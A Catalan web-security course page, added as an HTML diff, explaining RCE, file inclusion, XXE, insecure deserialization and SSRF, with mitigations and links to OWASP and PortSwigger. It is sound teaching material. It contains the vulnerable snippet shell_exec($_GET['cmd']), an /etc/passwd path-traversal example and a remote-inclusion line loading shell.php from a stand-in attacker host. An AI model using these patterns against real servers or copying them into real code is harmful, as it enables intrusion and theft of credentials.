@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="ca">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Vulnerabilitats d'Ampliació Tècnica - M03 U3 Posada en Producció Segura">
+    <title>M03 U3·M5 – Vulnerabilitats (Ampliació Tècnica)</title>
+    <link rel="stylesheet" href="css/indexM03-style.css">
+    <link rel="stylesheet" href="css/teoriaM03-style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="stars" id="stars"></div>
+    <div class="floating-circle circle-1"></div>
+    <div class="floating-circle circle-2"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="logo">
+            <div class="logo-icon"><span>M3</span></div>
+            <span class="logo-text">U3·M5 – Vulnerabilitats (Ampliació Tècnica)</span>
+        </div>
+        <nav class="nav">
+            <a href="teoriaM03U3Index.html" class="stars-count">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path>
+                    <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path>
+                </svg>
+                <span>Índex U3</span>
+            </a>
+            <a href="indexM03.html" class="stars-count">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
+                </svg>
+                <span>Inici</span>
+            </a>
+            <button id="theme-toggle" class="theme-toggle" aria-label="Canviar tema">
+                <svg class="sun-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2">
+                    <circle cx="12" cy="12" r="5"></circle>
+                    <line x1="12" y1="1" x2="12" y2="3"></line>
+                    <line x1="12" y1="21" x2="12" y2="23"></line>
+                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                    <line x1="1" y1="12" x2="3" y2="12"></line>
+                    <line x1="21" y1="12" x2="23" y2="12"></line>
+                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                </svg>
+                <svg class="moon-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                </svg>
+            </button>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+
+            <!-- Page Header -->
+            <div class="page-header">
+                <div class="page-tag">TEORIA · AMPLIACIÓ TÈCNICA</div>
+                <h1 class="page-title">Mòdul 5: Vulnerabilitats Avançades</h1>
+                <p class="page-subtitle">Aprofundiment en vulnerabilitats crítiques que permeten l'explotació real del
+                    sistema, des de l'execució de codi fins a la manipulació de peticions del servidor.</p>
+            </div>
+
+            <!-- Image placeholder Principal -->
+            <div class="image-placeholder image-placeholder-linked">
+                <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener" class="img-link-wrapper"
+                    aria-label="Obrir OWASP Top 10">
+                    <div class="img-placeholder-inner">
+                        <img src="images/teoriaM03/owasp-top10.png" alt="OWASP Top 10 Vulnerabilities"
+                            class="theory-img"
+                            onerror="this.parentElement.classList.add('img-missing'); this.style.display='none';">
+                        <div class="img-placeholder-label">
+                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="1.5">
+                                <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                                <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                <polyline points="21 15 16 10 5 21"></polyline>
+                            </svg>
+                            <span>Recursos: OWASP Top 10</span>
+                            <small>images/teoriaM03/owasp-top10.png</small>
+                        </div>
+                    </div>
+                    <div class="img-link-bar">
+                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2.5">
+                            <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                            <polyline points="15 3 21 3 21 9"></polyline>
+                            <line x1="10" y1="14" x2="21" y2="3"></line>
+                        </svg>
+                        <span>Llegir més: OWASP Top 10 Project</span>
+                    </div>
+                </a>
+            </div>
+
+            <!-- Progress Bar -->
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+
+            <!-- ===== SECCIÓ 5.4 ===== -->
+            <section class="theory-section" id="section-5-4">
+                <div class="section-header-tag">
+                    <span class="section-number">5.4</span>
+                    <h2 class="section-title">Execució Remota de Codi (RCE)</h2>
+                </div>
+
+                <div class="section-body">
+                    <div class="highlight-banner">
+                        <div class="highlight-banner-icon">💻</div>
+                        <div>L'atacant aconsegueix que el servidor executi ordres del sistema operatiu (bash/cmd).</div>
+                    </div>
+
+                    <div class="definition-stack">
+                        <div class="definition-card">
+                            <div class="def-icon-col">
+                                <div class="def-icon def-icon-red">⚠️</div>
+                            </div>
+                            <div class="def-content-col">
+                                <h3>Funció perillosa</h3>
+                                <p><code>shell_exec($_GET['cmd'])</code> — Permet l'execució directa d'inputs de
+                                    l'usuari.</p>
+                            </div>
+                        </div>
+                        <div class="definition-card">
+                            <div class="def-icon-col">
+                                <div class="def-icon def-icon-red">🐚</div>
+                            </div>
+                            <div class="def-content-col">
+                                <h3>Web Shell</h3>
+                                <p>L'objectiu final de l'RCE. Es pot obtenir una interfície d'administració remota (com mitjançant un <code>git clone</code> d'un repositori de shells) per navegar pel sistema.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="info-callout callout-blue" style="margin-top:1.5rem;">
+                        <span class="callout-icon">🛡️</span>
+                        <div>
+                            <strong>Mitigació:</strong> Utilitzar <code>escapeshellarg()</code> o, millor encara, utilitzar <strong>Llistes Blanques</strong> (només permetre comandaments coneguts) en lloc de llistes negres, ja que un atacant sempre pot trobar variants per saltar-se les prohibicions.
+                        </div>
+                    </div>
+
+                    <!-- Image placeholder RCE -->
+                    <div class="image-placeholder image-placeholder-linked">
+                        <a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank"
+                            rel="noopener" class="img-link-wrapper" aria-label="Obrir recurs sobre RCE">
+                            <div class="img-placeholder-inner">
+                                <img src="images/teoriaM03/rce-exploit.png" alt="Diagrama d'explotació RCE"
+                                    class="theory-img"
+                                    onerror="this.parentElement.classList.add('img-missing'); this.style.display='none';">
+                                <div class="img-placeholder-label">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="1.5">
+                                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                                        <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                        <polyline points="21 15 16 10 5 21"></polyline>
+                                    </svg>
+                                    <span>Diagrama: Remote Code Execution</span>
+                                    <small>images/teoriaM03/rce-exploit.png</small>
+                                </div>
+                            </div>
+                            <div class="img-link-bar">
+                                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2.5">
+                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                                    <polyline points="15 3 21 3 21 9"></polyline>
+                                    <line x1="10" y1="14" x2="21" y2="3"></line>
+                                </svg>
+                                <span>Llegir més: Command Injection — owasp.org</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== SECCIÓ 5.5 ===== -->
+            <section class="theory-section" id="section-5-5">
+                <div class="section-header-tag">
+                    <span class="section-number">5.5</span>
+                    <h2 class="section-title">Inclusió de Fitxers (LFI i RFI)</h2>
+                </div>
+
+                <div class="section-body">
+                    <div class="compare-banner">
+                        <div class="compare-side compare-cyber">
+                            <div class="compare-icon">📂</div>
+                            <h3>LFI (Local File Inclusion)</h3>
+                            <p>L'atacant llegeix fitxers interns del servidor (ex: <code>/etc/passwd</code>) usant
+                                <code>../</code> (Path Traversal).
+                            </p>
+                        </div>
+                        <div class="compare-divider"><span>+</span></div>
+                        <div class="compare-side compare-info">
+                            <div class="compare-icon">🌐</div>
+                            <h3>RFI (Remote File Inclusion)</h3>
+                            <p>L'atacant inclou un script allotjat en un servidor extern (ex:
+                                <code>include('http://ataca.com/shell.php')</code>).
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="info-callout callout-orange" style="margin-top:1.5rem;">
+                        <span class="callout-icon">⚙️</span>
+                        <div>
+                            <strong>Requisit RFI:</strong> Requereix que <code>allow_url_include</code> estigui en
+                            <strong>On</strong> al fitxer <code>php.ini</code>.
+                        </div>
+                    </div>
+
+                    <div class="info-callout callout-amber" style="margin-top:1.5rem;">
+                        <span class="callout-icon">☣️</span>
+                        <div>
+                            <strong>Log Poisoning:</strong> Tècnica avançada d'LFI que consisteix a injectar codi PHP en un fitxer de log (enverinar-lo) per després incloure'l i executar-lo.
+                        </div>
+                    </div>
+
+                    <!-- Image placeholder LFI/RFI -->
+                    <div class="image-placeholder image-placeholder-linked">
+                        <a href="https://portswigger.net/web-security/file-path-traversal" target="_blank"
+                            rel="noopener" class="img-link-wrapper" aria-label="Obrir recurs sobre Path Traversal">
+                            <div class="img-placeholder-inner">
+                                <img src="images/teoriaM03/lfi-rfi.png" alt="Diagrama LFI vs RFI" class="theory-img"
+                                    onerror="this.parentElement.classList.add('img-missing'); this.style.display='none';">
+                                <div class="img-placeholder-label">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="1.5">
+                                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                                        <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                        <polyline points="21 15 16 10 5 21"></polyline>
+                                    </svg>
+                                    <span>Diagrama: LFI vs RFI</span>
+                                    <small>images/teoriaM03/lfi-rfi.png</small>
+                                </div>
+                            </div>
+                            <div class="img-link-bar">
+                                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2.5">
+                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                                    <polyline points="15 3 21 3 21 9"></polyline>
+                                    <line x1="10" y1="14" x2="21" y2="3"></line>
+                                </svg>
+                                <span>Llegir més: File Path Traversal — portswigger.net</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== SECCIÓ 5.6 ===== -->
+            <section class="theory-section" id="section-5-6">
+                <div class="section-header-tag">
+                    <span class="section-number">5.6</span>
+                    <h2 class="section-title">XML External Entities (XXE)</h2>
+                </div>
+
+                <div class="section-body">
+                    <div class="two-col-cards">
+                        <div class="concept-card card-purple">
+                            <div class="concept-card-icon">🧬</div>
+                            <h3>L'atac</h3>
+                            <p>S'aprofita de processadors XML mal configurats que permeten carregar entitats externes.
+                            </p>
+                        </div>
+                        <div class="concept-card card-red">
+                            <div class="concept-card-icon">🎯</div>
+                            <h3>Conseqüència</h3>
+                            <p>Permet llegir fitxers interns o fer peticions des del servidor (SSRF).</p>
+                        </div>
+                    </div>
+
+                    <div class="info-callout callout-red" style="margin-top:1.5rem;">
+                        <span class="callout-icon">💣</span>
+                        <div>
+                            <h3>Billion Laughs</h3>
+                            <p>Tipus d'atac DoS mitjançant la recursió infinita d'entitats XML que consumeix tota la RAM
+                                del sistema.</p>
+                        </div>
+                    </div>
+
+                    <!-- Image placeholder XXE -->
+                    <div class="image-placeholder image-placeholder-linked">
+                        <a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener"
+                            class="img-link-wrapper" aria-label="Obrir recurs sobre XXE">
+                            <div class="img-placeholder-inner">
+                                <img src="images/teoriaM03/xxe-attack.png" alt="Diagrama d'atac XXE" class="theory-img"
+                                    onerror="this.parentElement.classList.add('img-missing'); this.style.display='none';">
+                                <div class="img-placeholder-label">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="1.5">
+                                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                                        <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                        <polyline points="21 15 16 10 5 21"></polyline>
+                                    </svg>
+                                    <span>Diagrama: XML External Entity</span>
+                                    <small>images/teoriaM03/xxe-attack.png</small>
+                                </div>
+                            </div>
+                            <div class="img-link-bar">
+                                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2.5">
+                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                                    <polyline points="15 3 21 3 21 9"></polyline>
+                                    <line x1="10" y1="14" x2="21" y2="3"></line>
+                                </svg>
+                                <span>Llegir més: XXE Injection — portswigger.net</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== SECCIÓ 5.7 ===== -->
+            <section class="theory-section" id="section-5-7">
+                <div class="section-header-tag">
+                    <span class="section-number">5.7</span>
+                    <h2 class="section-title">Deserialització Insegura</h2>
+                </div>
+
+                <div class="section-body">
+                    <div class="highlight-banner">
+                        <div class="highlight-banner-icon">🔄</div>
+                        <div><strong>Risc:</strong> Convertir dades de l'usuari en objectes de programació sense cap
+                            tipus de validació prèvia.</div>
+                    </div>
+
+                    <p class="section-text">L'explotació d'aquesta vulnerabilitat pot portar a un <strong>RCE</strong>
+                        si l'objecte té mètodes "màgics" com <code>__destruct()</code> o <code>__wakeup()</code>.</p>
+
+                    <div class="info-callout callout-blue" style="margin-top:1.5rem;">
+                        <span class="callout-icon">✅</span>
+                        <div>
+                            <strong>Solució:</strong> No utilitzar <code>unserialize()</code> amb dades que vinguin
+                            directament del client; és recomanable usar format <strong>JSON</strong>.
+                        </div>
+                    </div>
+
+                    <!-- Image placeholder Deserialization -->
+                    <div class="image-placeholder image-placeholder-linked">
+                        <a href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener"
+                            class="img-link-wrapper" aria-label="Obrir recurs sobre Deserialització Insegura">
+                            <div class="img-placeholder-inner">
+                                <img src="images/teoriaM03/insecure-deserialization.jpg"
+                                    alt="Diagrama de Deserialització Insegura" class="theory-img"
+                                    onerror="this.parentElement.classList.add('img-missing'); this.style.display='none';">
+                                <div class="img-placeholder-label">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="1.5">
+                                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                                        <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                        <polyline points="21 15 16 10 5 21"></polyline>
+                                    </svg>
+                                    <span>Diagrama: Insecure Deserialization</span>
+                                    <small>images/teoriaM03/insecure-deserialization.jpg</small>
+                                </div>
+                            </div>
+                            <div class="img-link-bar">
+                                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2.5">
+                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                                    <polyline points="15 3 21 3 21 9"></polyline>
+                                    <line x1="10" y1="14" x2="21" y2="3"></line>
+                                </svg>
+                                <span>Llegir més: Insecure Deserialization — portswigger.net</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== SECCIÓ 5.8 ===== -->
+            <section class="theory-section" id="section-5-8">
+                <div class="section-header-tag">
+                    <span class="section-number">5.8</span>
+                    <h2 class="section-title">Server-Side Request Forgery (SSRF)</h2>
+                </div>
+
+                <div class="section-body">
+                    <div class="definition-stack">
+                        <div class="definition-card">
+                            <div class="def-icon-col">
+                                <div class="def-icon def-icon-orange">🎭</div>
+                            </div>
+                            <div class="def-content-col">
+                                <h3>El truc</h3>
+                                <p>Enganyar el servidor perquè faci una petició a la seva pròpia xarxa interna, allà on
+                                    l'atacant no té accés directe des de l'exterior.</p>
+                            </div>
+                        </div>
+                        <div class="definition-card">
+                            <div class="def-icon-col">
+                                <div class="def-icon def-icon-green">☁️</div>
+                            </div>
+                            <div class="def-content-col">
+                                <h3>Objectiu típic</h3>
+                                <p>Accedir a les <strong>metadades de la màquina</strong> en entorns Cloud com AWS o
+                                    Google Cloud per obtenir tokens de seguretat.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Image placeholder SSRF -->
+                    <div class="image-placeholder image-placeholder-linked" style="margin-top: 2rem;">
+                        <a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener"
+                            class="img-link-wrapper" aria-label="Obrir recurs sobre SSRF">
+                            <div class="img-placeholder-inner">
+                                <img src="images/teoriaM03/SSRF_Attack.svg" alt="Diagrama d'atac SSRF"
+                                    class="theory-img"
+                                    onerror="this.parentElement.classList.add('img-missing'); this.style.display='none';">
+                                <div class="img-placeholder-label">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="1.5">
+                                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                                        <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                        <polyline points="21 15 16 10 5 21"></polyline>
+                                    </svg>
+                                    <span>Diagrama: Server-Side Request Forgery</span>
+                                    <small>images/teoriaM03/SSRF_Attack.svg</small>
+                                </div>
+                            </div>
+                            <div class="img-link-bar">
+                                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2.5">
+                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                                    <polyline points="15 3 21 3 21 9"></polyline>
+                                    <line x1="10" y1="14" x2="21" y2="3"></line>
+                                </svg>
+                                <span>Llegir més: SSRF Injection — portswigger.net</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Summary Card -->
+            <div class="summary-card">
+                <h2>🗂️ Resum: Vulnerabilitats d'Explotació</h2>
+                <div class="summary-grid">
+                    <div class="summary-item">
+                        <span class="summary-label">RCE</span>
+                        <span class="summary-desc">Execució d'ordres del sistema. Solució: escapeshellarg() o evitar
+                            crides al SO.</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">LFI / RFI</span>
+                        <span class="summary-desc">Inclusió de fitxers locals o remots. Requereix allow_url_include=On
+                            per a RFI.</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">XXE</span>
+                        <span class="summary-desc">Entitats externes XML. Pot portar a lectura de fitxers, SSRF o DoS
+                            (Billion Laughs).</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Deserialització</span>
+                        <span class="summary-desc">Objectes sense validar. Perill en mètodes màgics. Millor usar
+                            JSON.</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">SSRF</span>
+                        <span class="summary-desc">Peticions des del servidor cap a la seva xarxa interna (Metadades
+                            Cloud).</span>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script src="js/indexM03-script.js"></script>
+    <script src="js/teoriaM03-script.js"></script>
+</body>
+
+</html>
